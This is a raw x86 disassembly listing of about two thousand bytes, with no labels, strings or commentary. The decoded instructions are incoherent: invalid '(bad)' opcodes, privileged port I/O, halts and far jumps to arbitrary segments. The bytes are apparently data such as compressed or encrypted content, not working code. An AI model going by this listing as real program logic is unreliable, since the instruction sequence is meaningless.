  408d60:	lea    ebx,[ebx+0x3f]
  408d63:	inc    ebp
  408d64:	jmp    0x408d45
  408d66:	or     DWORD PTR [edx+0x4f272fd2],ecx
  408d6c:	and    al,0x8
  408d6e:	ss mov ebp,0x310a1ecc
  408d74:	out    dx,eax
  408d75:	push   edx
  408d76:	loopne 0x408d0f
  408d78:	sbb    ebp,edi
  408d7a:	xchg   BYTE PTR [ecx+0x40fefb17],al
  408d80:	sub    DWORD PTR [ebx-0x2a],edi
  408d83:	inc    edx
  408d84:	or     ecx,DWORD PTR [edi+0x1b]
  408d87:	jbe    0x408dd8
  408d89:	cmp    ah,BYTE PTR [edi-0x1c6278d9]
  408d8f:	aam    0xdf
  408d91:	cdq    
  408d92:	xchg   edi,eax
  408d93:	and    al,0x65
  408d95:	dec    ebx
  408d96:	ins    DWORD PTR es:[edi],dx
  408d97:	in     eax,dx
  408d98:	mov    bh,BYTE PTR [ecx-0x51e425b2]
  408d9e:	xchg   ebx,eax
  408d9f:	xchg   ecx,eax
  408da0:	xor    BYTE PTR [ebx-0x2a],dh
  408da3:	and    al,0x21
  408da5:	je     0x408dec
  408da7:	dec    ebp
  408da8:	mov    eax,0xc2ef1b80
  408dad:	sub    esi,DWORD PTR [esi-0x27a90908]
  408db3:	out    0x4e,eax
  408db5:	mov    cl,0x9d
  408db7:	lods   eax,DWORD PTR ds:[esi]
  408db8:	pushf  
  408db9:	xor    ah,BYTE PTR [eax+0x2f]
  408dbc:	xor    cl,BYTE PTR [esi-0x5c]
  408dbf:	adc    esi,esi
  408dc1:	inc    esi
  408dc2:	fstp   TBYTE PTR [edx-0x2454db2]
  408dc8:	fnstcw WORD PTR [ecx+0x31a1c688]
  408dce:	jmp    0x21414e91
  408dd3:	xchg   ecx,eax
  408dd4:	dec    edx
  408dd5:	push   ds
  408dd6:	push   0x75
  408dd8:	sub    bh,BYTE PTR [ecx]
  408dda:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408ddb:	jns    0x408d7e
  408ddd:	stos   BYTE PTR es:[edi],al
  408dde:	push   eax
  408ddf:	jl     0x408d6b
  408de1:	aad    0x53
  408de3:	das    
  408de4:	pop    ecx
  408de5:	rol    dh,cl
  408de7:	(bad)  [eax+0x35]
  408dea:	test   DWORD PTR [edi+ebp*1+0x59],esp
  408dee:	mov    cl,0x28
  408df0:	in     al,0x54
  408df2:	ret    0x1331
  408df5:	mov    BYTE PTR [esi-0x19e4262c],cl
  408dfb:	gs adc bh,ch
  408dfe:	hlt    
  408dff:	sub    ebp,DWORD PTR [ebx]
  408e01:	sub    BYTE PTR [edx],ah
  408e03:	test   al,0x30
  408e05:	inc    esp
  408e06:	repz arpl bp,sp
  408e09:	adc    al,0x4
  408e0b:	cmc    
  408e0c:	gs ja  0x408e87
  408e0f:	inc    DWORD PTR [edi-0x27]
  408e12:	icebp  
  408e13:	xchg   edi,eax
  408e14:	rcr    BYTE PTR [esi+0x53e080ef],0x4
  408e1b:	in     al,0xcb
  408e1d:	inc    edi
  408e1e:	jo     0x408df2
  408e20:	mov    ch,0x16
  408e22:	mov    al,ds:0xd30a420d
  408e27:	imul   ecx,DWORD PTR [edi+ebx*2],0xf8c129d0
  408e2e:	fiadd  DWORD PTR [ecx+0x31]
  408e31:	(bad)  
  408e32:	repz scas eax,DWORD PTR es:[edi]
  408e34:	fisubr WORD PTR [edi+0x2e1169e6]
  408e3a:	inc    edi
  408e3b:	xchg   DWORD PTR [ebx+esi*1+0xf78b52b],ebx
  408e42:	sbb    eax,0x68085abc
  408e47:	pop    eax
  408e48:	add    dh,BYTE PTR [ebp-0x5a]
  408e4b:	into   
  408e4c:	and    DWORD PTR [edi],eax
  408e4e:	cli    
  408e4f:	mov    ecx,DWORD PTR [ecx]
  408e51:	retf   
  408e52:	jae    0x408e8b
  408e54:	inc    ebp
  408e55:	and    dh,BYTE PTR cs:[eax-0x41]
  408e59:	pop    esi
  408e5a:	daa    
  408e5b:	mov    BYTE PTR [edx+0x3e],dl
  408e5e:	or     ebx,ebx
  408e60:	int    0xb0
  408e62:	inc    ebp
  408e63:	inc    esp
  408e64:	pop    edi
  408e65:	test   eax,0x27c29976
  408e6a:	out    0x91,al
  408e6c:	retf   
  408e6d:	scas   al,BYTE PTR es:[edi]
  408e6e:	test   dl,dl
  408e70:	pop    esp
  408e71:	jl     0x408e47
  408e73:	jg     0x408e05
  408e75:	xor    DWORD PTR [ebx-0x22ea471d],esi
  408e7b:	or     ah,BYTE PTR [edi-0x5]
  408e7e:	shl    ebx,1
  408e80:	adc    DWORD PTR [ecx-0x617be956],esp
  408e86:	pop    ebx
  408e87:	sub    BYTE PTR [edx],ch
  408e89:	inc    ecx
  408e8a:	arpl   bp,dx
  408e8c:	mov    bl,0x33
  408e8e:	pop    ebp
  408e8f:	ret    
  408e90:	arpl   WORD PTR [edx+0x699cbfc7],bx
  408e96:	fcomi  st,st(6)
  408e98:	iret   
  408e99:	cmp    DWORD PTR [edi+0x77ecf86e],ecx
  408e9f:	call   0x8f4d:0x8c69be09
  408ea6:	mov    dh,0x27
  408ea8:	pushf  
  408ea9:	loope  0x408ec2
  408eab:	(bad)  
  408eac:	(bad)  
  408ead:	addr16 in eax,dx
  408eaf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408eb0:	push   ss
  408eb1:	int3   
  408eb2:	jns    0x408e84
  408eb4:	mov    eax,ds:0x57788162
  408eb9:	xchg   ebx,eax
  408eba:	stc    
  408ebb:	(bad)
  408ebf:	cmp    eax,0x381d853f
  408ec4:	arpl   WORD PTR [ebx+0x12],ax
  408ec7:	cmp    al,0x22
  408ec9:	adc    eax,0xe9901b69
  408ecf:	adc    DWORD PTR [ecx+0x1c],esp
  408ed2:	rcl    DWORD PTR [edx-0x18b3c48],cl
  408ed8:	mov    ?,esp
  408eda:	sti    
  408edb:	pop    edi
  408edc:	lahf   
  408edd:	dec    esi
  408ede:	dec    esi
  408edf:	gs push cs
  408ee1:	add    dl,cl
  408ee3:	bnd jns 0x408ea2
  408ee6:	sub    eax,0x2b4f3a1e
  408eeb:	pop    es
  408eec:	pop    edx
  408eed:	inc    ecx
  408eee:	xchg   esp,eax
  408eef:	sbb    al,0xb8
  408ef1:	pop    ds
  408ef2:	push   esi
  408ef3:	xchg   esi,eax
  408ef4:	loopne 0x408ec7
  408ef6:	add    bh,BYTE PTR [esi]
  408ef8:	dec    edi
  408ef9:	cli    
  408efa:	push   eax
  408efb:	popf   
  408efc:	into   
  408efd:	inc    esp
  408efe:	add    eax,DWORD PTR [edi]
  408f00:	xor    BYTE PTR [ebx],bh
  408f02:	mov    ds:0xcd784024,al
  408f07:	adc    BYTE PTR [edi+eax*4],dl
  408f0a:	sbb    eax,0x9eb8dee8
  408f0f:	jge    0x408ee8
  408f11:	js     0x408ee8
  408f13:	out    dx,al
  408f14:	loopne 0x408f92
  408f16:	pop    ebx
  408f17:	add    bl,al
  408f19:	(bad)  
  408f1a:	lds    edx,FWORD PTR fs:[edi]
  408f1d:	or     DWORD PTR [edx],ecx
  408f1f:	pop    ebp
  408f20:	in     eax,0x2f
  408f22:	adc    dh,BYTE PTR [eax-0x5e8dbcf4]
  408f28:	imul   ebx,DWORD PTR [edi-0xf983ea0],0xffffff93
  408f2f:	xchg   DWORD PTR [ebp+edx*1+0x17bd1865],ebx
  408f36:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408f37:	push   ecx
  408f38:	dec    ecx
  408f39:	dec    edx
  408f3a:	mov    BYTE PTR [eax+esi*4+0x29],bl
  408f3e:	nop
  408f3f:	pop    edx
  408f40:	(bad)  
  408f41:	sbb    ah,al
  408f43:	fidiv  WORD PTR [ebx+edi*2-0x42]
  408f47:	stos   BYTE PTR es:[edi],al
  408f48:	inc    edx
  408f49:	add    dh,dh
  408f4b:	ins    BYTE PTR es:[edi],dx
  408f4c:	repz jle 0x408fcd
  408f4f:	clc    
  408f50:	add    BYTE PTR [esi+eiz*2-0x6d7f6456],0x81
  408f58:	fldenv [esi-0x5a]
  408f5b:	and    al,0x7
  408f5d:	or     dl,BYTE PTR [edi-0xf0a465c]
  408f63:	add    DWORD PTR [ebx+edi*1-0x4b],ecx
  408f67:	sub    BYTE PTR [ebx+0x61],0x9e
  408f6b:	xchg   esi,eax
  408f6c:	mov    dh,BYTE PTR [ebx-0x1770443c]
  408f72:	dec    ebp
  408f73:	push   ds
  408f74:	les    ecx,FWORD PTR [eax]
  408f76:	sub    DWORD PTR [ecx],esi
  408f78:	int3   
  408f79:	mov    edx,ecx
  408f7b:	(bad)
  408f7e:	(bad)  
  408f7f:	fmul   DWORD PTR [edx*2-0x5b8aaee9]
  408f86:	sbb    BYTE PTR [eax+0x7384d9da],al
  408f8c:	push   eax
  408f8d:	dec    eax
  408f8e:	or     eax,0x977456e2
  408f93:	xor    edi,eax
  408f95:	mul    DWORD PTR [eax-0x65]
  408f98:	pusha  
  408f99:	jl     0x408ff0
  408f9b:	push   ecx
  408f9c:	gs adc al,0x39
  408f9f:	sub    DWORD PTR [edi-0x61c49369],edi
  408fa5:	rcr    esp,1
  408fa7:	jge    0x408fb5
  408fa9:	mov    bl,0xf3
  408fab:	scas   al,BYTE PTR es:[edi]
  408fac:	mov    WORD PTR [edi+0x48],?
  408faf:	jge    0x408ffd
  408fb1:	xor    ebp,esp
  408fb3:	iret   
  408fb4:	adc    eax,0xfa03c769
  408fb9:	cmp    al,0x8e
  408fbb:	fucom  st(2)
  408fbd:	shr    BYTE PTR [ebx],0x24
  408fc0:	add    eax,0x2f57be3b
  408fc5:	sbb    DWORD PTR [eax+0x3bf2e238],esp
  408fcb:	and    eax,0x26a64732
  408fd0:	jns    0x408fd0
  408fd2:	adc    al,0xf8
  408fd4:	int3   
  408fd5:	mov    edx,0xc60619b6
  408fda:	dec    ebx
  408fdb:	repnz push cs
  408fdd:	retf   0x9ccc
  408fe0:	ret    0xa712
  408fe3:	sub    edi,DWORD PTR [ebx]
  408fe5:	pushf  
  408fe6:	mov    dh,0xfd
  408fe8:	inc    eax
  408fe9:	inc    esi
  408fea:	sub    BYTE PTR [eax-0x34],0xfe
  408fee:	and    al,0x51
  408ff0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408ff1:	mov    bh,0xa5
  408ff3:	mov    eax,ds:0xe0999c66
  408ff8:	sub    BYTE PTR [eax],cl
  408ffa:	shl    edx,1
  408ffc:	int3   
  408ffd:	sub    al,0x6a
  408fff:	xor    al,0xd5
  409001:	mov    ecx,0xfe653162
  409006:	aad    0xae
  409008:	mov    edi,0x365a0adb
  40900d:	jno    0x40904b
  40900f:	mov    gs,WORD PTR ds:0x488a4148
  409015:	mov    al,ds:0x564ce99e
  40901a:	int    0x8b
  40901c:	push   es
  40901d:	jecxz  0x409017
  40901f:	fdivr  QWORD PTR [eax-0x64a4b56]
  409025:	addr16 pop ss
  409027:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409028:	xchg   edi,ebp
  40902a:	repz neg DWORD PTR [ebp+0x7928d2db]
  409031:	dec    ecx
  409032:	retf   0xae8f
  409035:	xchg   ebx,eax
  409036:	mov    edx,0xbb7248f6
  40903b:	arpl   WORD PTR [ecx],bx
  40903d:	ds dec edx
  40903f:	cli    
  409040:	dec    esi
  409041:	or     edi,eax
  409043:	mov    al,0xa0
  409045:	hlt    
  409046:	mov    eax,ebp
  409048:	jl     0x4090a4
  40904a:	lock add eax,0x366cad4
  409050:	rcr    cl,0x9f
  409053:	sbb    edx,eax
  409055:	sahf   
  409056:	jle    0x40902f
  409058:	cdq    
  409059:	xchg   esi,eax
  40905a:	sub    eax,ebx
  40905c:	and    ah,BYTE PTR [ebp-0x62]
  40905f:	dec    ebx
  409060:	fadd   QWORD PTR [ecx]
  409062:	or     BYTE PTR [esi-0x49],bh
  409065:	or     BYTE PTR [edx+0x1a],dl
  409068:	rcl    ah,cl
  40906a:	imul   edx,DWORD PTR [edi+ebx*1-0x10],0x20
  40906f:	dec    edi
  409070:	(bad)  
  409071:	sbb    eax,0x88b4c9e8
  409076:	and    BYTE PTR [ecx],bh
  409078:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409079:	xchg   esp,eax
  40907a:	sbb    al,BYTE PTR [edx]
  40907c:	lea    edx,[eax-0x7c]
  40907f:	in     eax,0x77
  409081:	or     DWORD PTR [ecx],ebx
  409083:	inc    ebx
  409084:	popf   
  409085:	dec    ecx
  409086:	jo     0x409090
  409088:	cmp    edx,eax
  40908a:	repz pop ss
  40908c:	cmc    
  40908d:	sub    esp,DWORD PTR [ecx+0x6c]
  409090:	inc    edi
  409091:	mov    edx,0xabf8374f
  409096:	rcl    BYTE PTR [edx],1
  409098:	gs add esp,edi
  40909b:	sub    eax,0x8f207e8e
  4090a0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4090a1:	pop    edi
  4090a2:	cmp    eax,0x27069967
  4090a7:	jmp    0xf77a:0x77058e10
  4090ae:	mov    bh,0x22
  4090b0:	xor    al,0x9c
  4090b2:	(bad)  
  4090b4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4090b5:	dec    ecx
  4090b6:	pop    esp
  4090b7:	sub    DWORD PTR [ebp+0x5b833a06],edi
  4090bd:	fistp  WORD PTR [edx]
  4090bf:	test   BYTE PTR [ebp+0x52],cl
  4090c2:	fstp   TBYTE PTR [ebp+0x59450cc6]
  4090c8:	xor    al,BYTE PTR [edx]
  4090ca:	popf   
  4090cb:	push   ebx
  4090cc:	xchg   esp,eax
  4090cd:	scas   al,BYTE PTR es:[edi]
  4090ce:	sub    BYTE PTR [ebp-0x535671ea],ch
  4090d4:	stos   DWORD PTR es:[edi],eax
  4090d5:	jnp    0x4090a5
  4090d7:	and    al,0x3c
  4090d9:	mov    ch,0x2d
  4090db:	inc    ecx
  4090dc:	retf   0xf74
  4090df:	sar    BYTE PTR [ebx+0x12],1
  4090e2:	mov    edi,0xa665b2ff
  4090e7:	sahf   
  4090e8:	xlat   BYTE PTR ds:[ebx]
  4090e9:	call   0x3b42:0xefc66257
  4090f0:	je     0x4090de
  4090f2:	scas   al,BYTE PTR es:[edi]
  4090f3:	dec    ecx
  4090f4:	xchg   esi,eax
  4090f5:	ins    DWORD PTR es:[edi],dx
  4090f6:	dec    ecx
  4090f7:	fwait
  4090f8:	push   ds
  4090f9:	into   
  4090fa:	gs inc esi
  4090fc:	jmp    0xbc63:0x30c4e462
  409103:	mov    ebx,0xca01cef1
  409108:	repnz in eax,dx
  40910a:	mov    ebp,0xde255ff8
  40910f:	aad    0x35
  409111:	mov    BYTE PTR [ebx+0x3d],dh
  409114:	aad    0xce
  409116:	xchg   edx,eax
  409117:	test   eax,0x2d69196
  40911c:	or     eax,0x29dbfc42
  409121:	inc    ebp
  409122:	xchg   edx,eax
  409123:	cmp    edi,DWORD PTR [edi+edx*4]
  409126:	scas   al,BYTE PTR es:[edi]
  409127:	adc    DWORD PTR [ecx-0x5b18c585],esi
  40912d:	add    ecx,esp
  40912f:	ret    0x5883
  409132:	cmp    bh,BYTE PTR [esi]
  409134:	lods   eax,DWORD PTR ds:[esi]
  409135:	dec    ebx
  409136:	call   DWORD PTR [esi]
  409138:	inc    ebp
  409139:	add    eax,0xc1ede84c
  40913e:	fs pop edi
  409140:	cmp    eax,0x5c5940c2
  409145:	lock cmp ch,ch
  409148:	push   0x37388c72
  40914d:	dec    esp
  40914e:	jmp    0x5356:0xc0016b1e
  409155:	sub    eax,0x9158d788
  40915a:	hlt    
  40915b:	test   ch,ah
  40915d:	out    0xf4,al
  40915f:	ins    BYTE PTR es:[edi],dx
  409160:	(bad)
  409163:	mov    WORD PTR [ebx+0x4b502675],gs
  409169:	xor    BYTE PTR [esi+ecx*8-0x3d202825],ch
  409170:	ins    DWORD PTR es:[edi],dx
  409171:	inc    eax
  409172:	imul   ecx,DWORD PTR [edi-0x63],0x8d57b88
  409179:	out    dx,al
  40917a:	pop    esp
  40917b:	dec    ebx
  40917c:	pushf  
  40917d:	inc    ebp
  40917e:	mov    edx,0x640ea991
  409183:	ds pop edx
  409185:	inc    esp
  409186:	leave  
  409187:	inc    ebp
  409188:	test   eax,0x36992a3e
  40918d:	fdivr  st(2),st
  40918f:	shl    BYTE PTR [ebx+ecx*2+0x2181f0d8],1
  409196:	or     al,0x20
  409198:	retf   0xfa6e
  40919b:	ins    BYTE PTR es:[edi],dx
  40919c:	jg     0x409126
  40919e:	and    DWORD PTR ds:0xdff6aafb,edi
  4091a4:	and    ebp,DWORD PTR [esi+esi*8+0x4ae7e0b0]
  4091ab:	shl    dh,cl
  4091ad:	scas   eax,DWORD PTR es:[edi]
  4091ae:	mov    ds:0x1007c832,al
  4091b3:	les    ebp,FWORD PTR [esi+0x23]
  4091b6:	mov    ebp,0xf31046fe
  4091bb:	neg    DWORD PTR [edx+ebp*2]
  4091be:	imul   ecx,DWORD PTR [esi-0x4c8d1f9f],0xffffffea
  4091c5:	xchg   DWORD PTR [esi-0x1e89be9c],edi
  4091cb:	sbb    BYTE PTR [edi+0x3],ah
  4091ce:	add    DWORD PTR [eax],ebx
  4091d0:	int3   
  4091d1:	xchg   edx,eax
  4091d2:	rol    DWORD PTR [ecx-0x1976eea3],cl
  4091d8:	add    al,0xa2
  4091da:	jmp    0x379480c9
  4091df:	pop    ss
  4091e0:	fstp   QWORD PTR [eax]
  4091e2:	inc    esi
  4091e3:	mov    al,ds:0x3f5ef652
  4091e8:	pop    esp
  4091e9:	jl     0x40922d
  4091eb:	mov    eax,ds:0x70818f8c
  4091f0:	aas    
  4091f1:	inc    edx
  4091f2:	ja     0x409223
  4091f4:	add    edx,0x92142c66
  4091fa:	pop    edx
  4091fb:	jmp    0x40920b
  4091fd:	jmp    0x4091d7
  4091ff:	jp     0x4091d0
  409201:	iret   
  409202:	jg     0x40919c
  409204:	hlt    
  409205:	push   ss
  409206:	test   BYTE PTR [ebx],bl
  409208:	push   0x82538db9
  40920d:	mov    ecx,gs
  40920f:	sbb    DWORD PTR [esp+ebp*8+0x27],ebx
  409213:	xchg   edx,eax
  409214:	sbb    bl,BYTE PTR ds:0xeabdbd63
  40921a:	mov    ecx,0x94c236dd
  40921f:	jge    0x409282
  409221:	adc    al,0xb
  409223:	imul   ebx,DWORD PTR [ecx-0x5e],0xffffff87
  409227:	sub    BYTE PTR ds:0x5d634245,dh
  40922d:	inc    ebp
  40922e:	add    al,0x98
  409230:	cli    
  409231:	mov    edx,0xae91bd6a
  409236:	dec    ecx
  409237:	cmp    edi,ecx
  409239:	mov    esi,0x6d4adee0
  40923e:	(bad)  
  40923f:	fcomi  st,st(7)
  409241:	out    dx,ax
  409243:	dec    ecx
  409244:	dec    ebx
  409245:	int    0x24
  409247:	sbb    ebx,DWORD PTR [ebp+0x7ac82694]
  40924d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40924e:	(bad)  
  40924f:	(bad)  
  409251:	adc    DWORD PTR [ecx-0x5a9d9b05],edi
  409257:	mov    dl,0xbb
  409259:	outs   dx,BYTE PTR ds:[esi]
  40925a:	repz cli 
  40925c:	mov    ds:0x168171ff,eax
  409261:	mov    WORD PTR [edx],?
  409263:	add    BYTE PTR ds:0x31f6716f,dh
  409269:	mov    al,ds:0x235bc173
  40926e:	pop    eax
  40926f:	rol    DWORD PTR [esi+ebx*1-0x1df6db75],1
  409276:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409277:	sbb    al,0x29
  409279:	pushw  ds
  40927b:	xor    ah,BYTE PTR [eax]
  40927d:	cmp    al,0xc3
  40927f:	clc    
  409280:	inc    ebp
  409281:	push   es
  409282:	push   edx
  409283:	cli    
  409284:	rcr    ebx,cl
  409286:	inc    edi
  409287:	mov    ah,0xa2
  409289:	mov    ch,0xea
  40928b:	in     al,0x24
  40928d:	pop    ds
  40928e:	and    al,0xad
  409290:	test   BYTE PTR [ebx+eiz*4],bh
  409293:	das    
  409294:	lods   al,BYTE PTR ds:[esi]
  409295:	(bad)  
  409296:	sub    DWORD PTR [ecx+0x1e],0x6c4e227d
  40929d:	sub    BYTE PTR [edi+0x3f26dcff],cl
  4092a3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4092a4:	fwait
  4092a5:	add    DWORD PTR [edx+0x31cac034],esp
  4092ab:	arpl   WORD PTR [edi-0x56b149ef],bp
  4092b1:	out    dx,al
  4092b2:	popf   
  4092b3:	adc    edi,edx
  4092b5:	cmp    BYTE PTR [esi+edx*8-0x523b2468],cl
  4092bc:	enter  0xff3,0x39
  4092c0:	pop    esp
  4092c1:	pusha  
  4092c2:	mov    eax,0xcc1f163f
  4092c7:	mov    al,0xe2
  4092c9:	xor    DWORD PTR [eax-0x5f008b9d],eax
  4092cf:	sub    DWORD PTR [eax],0xffffffdb
  4092d2:	xor    BYTE PTR [ecx],cl
  4092d4:	xor    eax,0x4fa1a0e2
  4092d9:	or     BYTE PTR [edi],al
  4092db:	pop    ds
  4092dc:	mov    esi,ebx
  4092de:	into   
  4092df:	rol    DWORD PTR [edi+0x5668eb9a],cl
  4092e5:	sbb    bl,BYTE PTR [edi]
  4092e7:	fst    DWORD PTR [ebx]
  4092e9:	shl    eax,1
  4092eb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4092ec:	mov    edx,0xce2f68b2
  4092f1:	inc    esp
  4092f2:	inc    edi
  4092f3:	rcl    BYTE PTR [esi+0x50],cl
  4092f6:	(bad)  
  4092f7:	in     eax,dx
  4092f8:	inc    edx
  4092f9:	adc    ebp,DWORD PTR [ebx-0x6a476a6b]
  4092ff:	adc    bh,BYTE PTR [eax]
  409301:	leave  
  409302:	movd   mm0,DWORD PTR [edx+esi*1+0x3b822b3f]
  40930a:	retf   
  40930b:	aad    0xf6
  40930d:	(bad)  
  40930e:	test   al,0x4f
  409310:	lahf   
  409311:	arpl   WORD PTR [edi+esi*1],di
  409314:	cmc    
  409315:	daa    
  409316:	imul   eax,DWORD PTR [ecx+0x46],0xec4c7655
  40931d:	pop    edi
  40931e:	test   eax,0x5c370cd
  409323:	cmp    ebx,DWORD PTR [esi+0x5]
  409326:	retf   0x2d26
  409329:	dec    ecx
  40932a:	mov    BYTE PTR [ebp+edi*2+0x777df5e0],ah
  409331:	and    DWORD PTR [ebx],ebx
  409333:	sar    DWORD PTR [ecx+esi*1-0x1bc7b7c],0xc5
  40933b:	push   eax
  40933c:	and    al,BYTE PTR [edi]
  40933e:	or     al,0x6e
  409340:	mov    bl,cl
  409342:	xor    ebp,DWORD PTR [edi]
  409344:	ja     0x40937c
  409346:	ret    
  409347:	xchg   edx,eax
  409348:	jns    0x40935e
  40934a:	xchg   edi,eax
  40934b:	sbb    eax,0x9e8b952e
  409350:	mov    ah,0x7b
  409352:	mov    al,ds:0xb085a90
  409357:	inc    DWORD PTR [edi-0x29]
  40935a:	push   0xffffffa6
  40935c:	push   esi
  40935d:	mov    al,dh
  40935f:	xchg   ecx,eax
  409360:	xchg   ebx,eax
  409361:	xor    al,0x55
  409363:	out    0x45,al
  409365:	cmp    BYTE PTR [ebp+0x63b3dff5],bl
  40936b:	adc    BYTE PTR [ecx],ch
  40936d:	xor    DWORD PTR [eax+ebx*4+0x71],ebx
  409371:	cmc    
  409372:	inc    ebp
  409373:	cmp    al,0xfd
  409375:	stos   BYTE PTR es:[di],al
  409377:	inc    ecx
  409378:	or     ebx,edi
  40937a:	or     edi,DWORD PTR [edi+0x54dd83b3]
  409380:	xchg   ebx,eax
  409381:	ror    DWORD PTR [ecx+eiz*1],1
  409384:	xchg   ebp,eax
  409385:	bound  eax,QWORD PTR [esi+eiz*2+0x5d07b233]
  40938c:	sbb    eax,0xb54a3ca3
  409391:	je     0x4093d0
  409393:	dec    esi
  409394:	pop    es
  409395:	pop    ebp
  409396:	and    al,0x72
  409398:	shl    BYTE PTR [eax],1
  40939a:	stos   DWORD PTR es:[edi],eax
  40939b:	aas    
  40939c:	push   ds
  40939d:	fwait
  40939e:	and    ecx,ecx
  4093a0:	ds jmp 0x10029d50
  4093a6:	nop
  4093a7:	xor    eax,esp
  4093a9:	outs   dx,BYTE PTR ds:[esi]
  4093aa:	in     eax,0x1d
  4093ac:	pop    ebx
  4093ad:	mov    bh,dl
  4093af:	xchg   edx,eax
  4093b0:	in     eax,dx
  4093b1:	aas    
  4093b2:	adc    BYTE PTR [ebx-0x4b],ch
  4093b5:	push   es
  4093b6:	cwde   
  4093b7:	mov    ds:0x75606bc8,al
  4093bc:	scas   eax,DWORD PTR es:[edi]
  4093bd:	cmp    ecx,DWORD PTR [esi+0x6ccd979b]
  4093c3:	or     ch,BYTE PTR [edx+0x20e5292]
  4093c9:	and    BYTE PTR [ebx-0x12],0xc1
  4093cd:	sbb    edi,DWORD PTR [edx]
  4093cf:	mov    ds:0x485741ed,al
  4093d4:	popf   
  4093d5:	and    esi,ebp
  4093d7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4093d8:	rcr    BYTE PTR [esi],0xb9
  4093db:	jge    0x40937a
  4093dd:	dec    esi
  4093de:	test   al,0xfe
  4093e0:	clc    
  4093e1:	mov    ds:0x14059604,al
  4093e6:	pop    esi
  4093e7:	sub    ah,bl
  4093e9:	add    eax,0x48701139
  4093ee:	dec    edx
  4093ef:	sbb    ebx,DWORD PTR [eax+edi*1+0x6caf97e6]
  4093f6:	loopne 0x409384
  4093f8:	rcr    BYTE PTR [ebp+0x1],cl
  4093fb:	(bad)  
  4093fc:	pop    ecx
  4093fd:	aas    
  4093fe:	lock sub ch,BYTE PTR [ecx-0x24f233c8]
  409405:	pop    eax
  409406:	and    eax,0xb1f44685
  40940b:	pop    edi
  40940c:	jbe    0x40939f
  40940e:	cmp    DWORD PTR [edx-0x1f41206d],esp
  409414:	sahf   
  409415:	push   ss
  409416:	xchg   ecx,eax
  409417:	es std 
  409419:	jae    0x409469
  40941b:	xlat   BYTE PTR ds:[ebx]
  40941c:	jmp    0x59f1aa80
  409421:	(bad)  [esi-0xe]
  409424:	pop    ebp
  409425:	lahf   
  409426:	shl    DWORD PTR [edx+0x3e],1
  409429:	xor    dh,bl
  40942b:	dec    eax
  40942c:	int3   
  40942d:	sar    BYTE PTR [edx],0xf6
  409430:	mov    edi,DWORD PTR [esi-0x361fd002]
  409436:	mov    ebp,0xeefdcdff
  40943b:	xor    esi,ebx
  40943d:	loop   0x409458
  40943f:	sbb    BYTE PTR [edi-0xe],cl
  409442:	mul    DWORD PTR [ebx-0x428b4efb]
  409448:	inc    edx
  409449:	push   esi
  40944a:	outs   dx,DWORD PTR ds:[esi]
  40944b:	test   BYTE PTR [esi+0x25],0x3e
  40944f:	fmul   st,st(3)
  409451:	jmp    0x40948f
  409453:	xchg   DWORD PTR ds:0x8d9bcafd,ebp
  409459:	(bad)  
  40945b:	pusha  
  40945c:	inc    esi
  40945d:	test   eax,0x68af18f9
  409462:	in     al,0x31
  409464:	neg    DWORD PTR [ebp-0x1a92e2f6]
  40946a:	jbe    0x4094b1
  40946c:	ja     0x4094eb
  40946e:	popf   
  40946f:	adc    ecx,DWORD PTR [edi-0x29]
  409472:	aas    
  409473:	daa    
  409474:	xor    bh,BYTE PTR [esi+edi*8]
  409477:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409478:	sar    al,cl
  40947a:	add    BYTE PTR [edx],ch
  40947c:	mov    edx,0x8d08ac89
  409481:	mov    edx,DWORD PTR [esi+ebp*1-0x2a]
  409485:	(bad)  
  409486:	xor    eax,eax
  409488:	dec    esp
  409489:	jns    0x409472
  40948b:	enter  0x6528,0x8c
  40948f:	sub    al,BYTE PTR [edi+0x2fc7a5d5]
  409495:	pushw  0x825c
  409499:	mov    bl,0x6
  40949b:	leave  
  40949c:	or     bh,al
  40949e:	pop    esp
  40949f:	adc    esp,DWORD PTR [esi+0x7a1a50e8]
  4094a5:	adc    eax,0x1fee685b
  4094aa:	out    0x91,eax
  4094ac:	dec    esp
  4094ad:	sti    
  4094ae:	sbb    al,0x9b
  4094b0:	sti    
  4094b1:	or     DWORD PTR [ebp+0x32127e8a],eax
  4094b7:	std    
  4094b8:	pop    esi
  4094b9:	adc    al,0x1a
  4094bb:	dec    edx
  4094bc:	xor    al,0x2
  4094be:	add    eax,DWORD PTR [ebx-0x21]
  4094c1:	mov    cl,dh
  4094c3:	fild   WORD PTR [eax+0xa]
  4094c6:	inc    bx
  4094c8:	hlt    
  4094c9:	dec    ebp
  4094ca:	or     eax,0x63039db0
  4094cf:	sub    al,0x76
  4094d1:	ins    DWORD PTR es:[edi],dx
  4094d2:	(bad)  
  4094d3:	push   eax
  4094d4:	adc    esp,DWORD PTR [eax+0x1c]
  4094d7:	nop
  4094d8:	mov    ch,0x74
  4094da:	add    DWORD PTR [edx-0x15c554cd],edx
  4094e0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4094e1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4094e2:	mov    edx,0x2da64224
  4094e7:	mov    esp,0x46cf6741
  4094ec:	fcmove st,st(6)
  4094ee:	pop    edi
  4094ef:	inc    esi
  4094f0:	adc    esi,DWORD PTR [ebx+esi*2+0x10085744]
  4094f7:	dec    ebx
  4094f8:	pop    ds
  4094f9:	push   ds
  4094fa:	div    DWORD PTR [ebx+0x4fb914a0]
  409500:	(bad)  
  409501:	(bad)  [ebp+0x6a]
  409504:	popf   
  409505:	int3   
  409506:	sub    BYTE PTR [ebp-0x5f],bl
  409509:	retf   
  40950a:	push   edi
  40950b:	test   eax,0x11c6aeab
  409510:	mov    esi,DWORD PTR [esi+0x35]
  409513:	push   ebp
  409514:	outs   dx,BYTE PTR ds:[esi]
  409515:	pushf  
